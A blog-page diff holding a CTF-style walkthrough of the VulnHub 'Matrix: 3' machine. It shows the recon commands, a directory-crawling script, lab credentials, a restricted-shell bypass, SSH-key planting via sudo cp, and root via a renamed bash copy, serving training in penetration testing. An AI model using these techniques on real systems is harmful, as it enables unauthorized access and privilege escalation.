@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Matrix: 3 - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Matrix: 3 - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/vulnhub/2019-08-06-vulnhub_matrix_3_writeup/">Matrix: 3 - Writeup</a></h4>
+    <h5>August 6, 2019</h5>
+    
+    <a href="https://0x23b.github.io/tags/vulnhub"><kbd class="item-tag">Vulnhub</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="matrix-3-writeup">Matrix: 3 - Writeup</h1>
+
+<h2 id="summary">Summary</h2>
+
+<p>This is the 3rd machine of the Matrix series, which I really enjoyed. Although it should be pretty straight forward, it took me quite a while, to finish this machine. First, we have to find credentials running through several directories on a web server. With those credentials, we can access another web server and download an executable, that includes username and password. With those credentials, we can access the system through ssh. After bypassing a restricted shell, we have to run two sudo privileged executables to get root.</p>
+
+<h2 id="identifying-the-host">Identifying the host</h2>
+
+<p>Again, we can do a quick nmap scan, to identify the host ip address:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/matrix3# nmap -sn 192.168.178.*
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-30 21:43 CEST
+...
+Nmap scan report for matrix (192.168.178.50)
+Host is up (0.0033s latency).
+MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)
+...
+Nmap done: 256 IP addresses (12 hosts up) scanned in 15.04 seconds
+</code></pre>
+
+<h2 id="port-scan">Port scan</h2>
+
+<p>After we have the host, we can quikly run a full port scan:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/matrix3# nmap -p- -oA full_tcp 192.168.178.50
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-30 21:45 CEST
+Nmap scan report for matrix (192.168.178.50)
+Host is up (0.0025s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+6464/tcp open  ieee11073-20701
+7331/tcp open  swx
+MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds
+</code></pre>
+
+<p>There are three ports open. Let&rsquo;s start with digging depper in port 80.</p>
+
+<h2 id="port-80">Port 80</h2>
+
+<p>As usual, we should start with a directory listing. Therefore I&rsquo;m going to use gobuster:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/matrix3# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.178.50
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.178.50
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2019/07/30 23:00:49 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/assets (Status: 301)
+/Matrix (Status: 301)
+Progress: 140941 / 220561 (63.90%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2019/07/30 21:50:34 Finished
+===============================================================
+</code></pre>
+
+<p>An interesting directory called <code>Matrix</code> was found. When inspecting this directory, we are getting following directory listing:</p>
+
+<pre><code>Directory listing for /Matrix/
+
+    4/
+    6/
+    c/
+    d/
+    e/
+    i/
+    k/
+    n/
+    o/
+    u/
+    v/
+    w/
+</code></pre>
+
+<p>Clicking on <code>4</code>, leads to another directory listing. I assume, that we need to find the right combination of characters, to get something useful. I&rsquo;ve written a small python script, which recursively follows the directories.</p>
+
+<pre><code class="language-python">import requests
+import re
+
+def follow_the_white_rabbit(url):
+    r = requests.get(url)
+    resp = r.text
+    match = re.findall(r&quot;href=\&quot;(.*)\&quot;&quot;, resp)
+    for i in match:
+        print(url+i)
+        follow_the_white_rabbit(url+i)
+
+follow_the_white_rabbit(&quot;http://192.168.178.50/Matrix/&quot;)
+</code></pre>
+
+<p>After executing the script and running it for a while, we get the result, we wanted:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/matrix3# python brute_dir.py
+...
+http://192.168.178.50/Matrix/n/e/o/6/3/
+http://192.168.178.50/Matrix/n/e/o/6/4/
+http://192.168.178.50/Matrix/n/e/o/6/4/secret.gz
+http://192.168.178.50/Matrix/n/e/o/6/5/
+http://192.168.178.50/Matrix/n/e/o/6/6/
+...
+</code></pre>
+
+<p>Great! Let&rsquo;s get this file and see, what&rsquo;s in there:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/matrix3# curl http://192.168.178.50/Matrix/n/e/o/6/4/secret.gz
+admin:76a2173be6393254e72ffa4d6df1030a
+</code></pre>
+
+<p>This looks like credentials! As the password is an md5 hash, we can just try to google it instead of cracking, where the first result reveals the value:</p>
+
+<pre><code>passwd
+</code></pre>
+
+<h2 id="port-7331">Port 7331</h2>
+
+<p>There is another web server running on this machine behind this port. Visiting it requires us to authenticate. Glad, that we already gathered credentials, which we can use here. Now, the index page reveals nothing interesting, but looking at <code>robots.txt</code> gives us another clue, where to look next:</p>
+
+<pre><code>User-agent: *
+Disallow: /data/
+</code></pre>
+
+<p>Visiting this directory allows us to download a file called <code>data</code>, which is a Mono/.Net executable:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/matrix3# file data
+data: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
+</code></pre>
+
+<p>Opening up this executable with <code>x32dbg</code> and looking into the <code>.text</code> section from the memory tab, we can see another credentials:</p>
+
+<pre><code class="language-bash">001F32D0  00 21 67 00 75 00 65 00 73 00 74 00 3A 00 37 00  .!g.u.e.s.t.:.7.  
+001F32E0  52 00 31 00 6E 00 31 00 37 00 79 00 4E 00 33 00  R.1.n.1.7.y.N.3.  
+001F32F0  30 00 00 0B 46 00 6F 00 72 00 6D 00 31 00 00 13  0...F.o.r.m.1...  
+</code></pre>
+
+<pre><code>guest:7R1n17yN30
+</code></pre>
+
+<h2 id="port-6464">Port 6464</h2>
+
+<p>There is one last port open on this machine. We can examine with netcat, what this port is good for:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/matrix3# nc -vvvv 192.168.178.50 6464
+matrix [192.168.178.50] 6464 (?) open
+SSH-2.0-OpenSSH_7.7
+</code></pre>
+
+<p>Perfect! We can now try to login with the found credentials:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/matrix3# ssh guest@192.168.178.50 -p 6464
+guest@192.168.178.50's password:
+...
+guest@matrix:~$ id
+-rbash: id: command not found
+</code></pre>
+
+<p>Whoops! We can login, but we get a restricted shell! Logout and try again with option <code>-t bash</code> to bypass the restriction:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/matrix3# ssh guest@192.168.178.50 -p 6464 -t bash
+guest@192.168.178.50's password:
+guest@matrix:~$ id
+uid=1000(guest) gid=100(users) groups=100(users),7(lp),11(floppy),17(audio),18(video),19(cdrom),83(plugdev),84(power),86(netdev),93(scanner),997(sambashare)
+</code></pre>
+
+<p>One of the first things I&rsquo;m doing when accessing a system is to check if any command can be executed with sudo:</p>
+
+<pre><code>guest@matrix:~$ sudo -l
+User guest may run the following commands on matrix:
+    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
+    (trinity) NOPASSWD: /bin/cp
+</code></pre>
+
+<p>As we can run <code>/bin/cp</code> as user trinity, we can create an ssh key and copy the public key into the <code>authorized_keys</code> file in the .ssh directory of trinity, so that we can ssh login as that user:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/matrix3# ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): /mnt/hgfs/Share/vulnhub/matrix3/id_rsa
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /mnt/hgfs/Share/vulnhub/matrix3/id_rsa.
+Your public key has been saved in /mnt/hgfs/Share/vulnhub/matrix3/id_rsa.pub.
+The key fingerprint is:
+SHA256:8GX47yk6MC9X8vPdXLw8zZeEkSgIVV6XBNzlHYwedNs root@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|      .....o=+=+ |
+|     .  .....=o.=|
+|      o o.o o ooE|
+|       + = . +   |
+|        S o   o  |
+|      o . .. . o |
+|       + +  . ..=|
+|      . + +. o.=*|
+|       o.o ++ .o=|
++----[SHA256]-----+
+root@kali:/mnt/hgfs/Share/vulnhub/matrix3# cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEyq4hhvOApxqfVmIzz67opDNbaZPhE42LY3vmtHnpFlqJKkSIKBnBE7JuAv3Vs/baerLmmtelBmWk4U+VAHhstI6Ag9knKXKGHO6MvKNLtkwMPduDXMxuu+ZHk0GinCHLKemuwmYtsxku2+3nPv8Odch7UaPLD3H6/YWMfcceW0liOAQKdLuGTeUP4Phb9VTvc8wrTCee0YVNbvkY8ifyOtvlYtIcH0ZFVopcbiKRuVpLbYB9T7Km5JnPDnzocIbGZtL7OJUxrTNKb8NdYcV85Uv3Q6q5VhPVyYeGGc2PDQs3RP9kE0PM5j7vRjlXnKBYRntsuQ6i7OPzWXlQ9rODRKG4VFgzPIbAeZY7JVbOItrIKTbBySPK35sYTt8bd4js3P7ozieOORYdZbvHDRHpal/ApPbjOs2/EMesB0WPEpp8rBsMwWgkZsFg4esZ+DLlITUxVWfbj+fNv38Q97LtfpbW6wz6XWfxDtSErU1jvs5d3WxYe0oZRo+AQKsEl2U= root@kali
+
+guest@matrix:~$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEyq4hhvOApxqfVmIzz67opDNbaZPhE42LY3vmtHnpFlqJKkSIKBnBE7JuAv3Vs/baerLmmtelBmWk4U+VAHhstI6Ag9knKXKGHO6MvKNLtkwMPduDXMxuu+ZHk0GinCHLKemuwmYtsxku2+3nPv8Odch7UaPLD3H6/YWMfcceW0liOAQKdLuGTeUP4Phb9VTvc8wrTCee0YVNbvkY8ifyOtvlYtIcH0ZFVopcbiKRuVpLbYB9T7Km5JnPDnzocIbGZtL7OJUxrTNKb8NdYcV85Uv3Q6q5VhPVyYeGGc2PDQs3RP9kE0PM5j7vRjlXnKBYRntsuQ6i7OPzWXlQ9rODRKG4VFgzPIbAeZY7JVbOItrIKTbBySPK35sYTt8bd4js3P7ozieOORYdZbvHDRHpal/ApPbjOs2/EMesB0WPEpp8rBsMwWgkZsFg4esZ+DLlITUxVWfbj+fNv38Q97LtfpbW6wz6XWfxDtSErU1jvs5d3WxYe0oZRo+AQKsEl2U= root@kali&quot; &gt; authorized_keys
+guest@matrix:~$ sudo -u trinity /bin/cp authorized_keys /home/trinity/.ssh/authorized_keys
+
+root@kali:/mnt/hgfs/Share/vulnhub/matrix3# ssh trinity@192.168.178.50 -p 6464 -i id_rsa
+...
+trinity@matrix:~$ sudo -l
+User trinity may run the following commands on matrix:
+    (root) NOPASSWD: /home/trinity/oracle
+</code></pre>
+
+<p>We are now in as trinity. Again, the first thing is checking sudo privileges. We can run <code>/home/trinity/oracle</code> as root user, but that file does not exist yet. What we can do, in order to get the root user is to copy <code>/bin/bash</code> into the home directory, name it <code>oracle</code> and run it with <code>sudo</code>.</p>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<pre><code>trinity@matrix:~$ cp /bin/bash ./oracle
+trinity@matrix:~$ sudo -u root ./oracle
+root@matrix:/home/trinity# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+root@matrix:/home/trinity# cd ~
+root@matrix:~# cat flag.txt
+
+
+             ,----------------,              ,---------,
+        ,-----------------------,          ,&quot;        ,&quot;|
+      ,&quot;                      ,&quot;|        ,&quot;        ,&quot;  |
+     +-----------------------+  |      ,&quot;        ,&quot;    |
+     |  .-----------------.  |  |     +---------+      |
+     |  |                 |  |  |     | -==----'|      |
+     |  |  Matrix is      |  |  |     |         |      |
+     |  |  compromised    |  |  |/----|`---=    |      |
+     |  |  C:\&gt;_reload    |  |  |   ,/|==== ooo |      ;
+     |  |                 |  |  |  // |(((( [33]|    ,&quot;
+     |  `-----------------'  |,&quot; .;'| |((((     |  ,&quot;
+     +-----------------------+  ;;  | |         |,&quot;     -morpheus AKA (unknowndevice64)-
+        /_)______________(_/  //'   | +---------+
+   ___________________________/___  `,
+  /  oooooooooooooooo  .o.  oooo /,   \,&quot;-----------
+ / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,&quot;
+/_==__==========__==_ooo__ooo=_/'   /___________,&quot;
+`-----------------------------'
+
+-[ 7h!5 !5 n07 7h3 3nd, m47r!x w!11 r37urn ]-
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
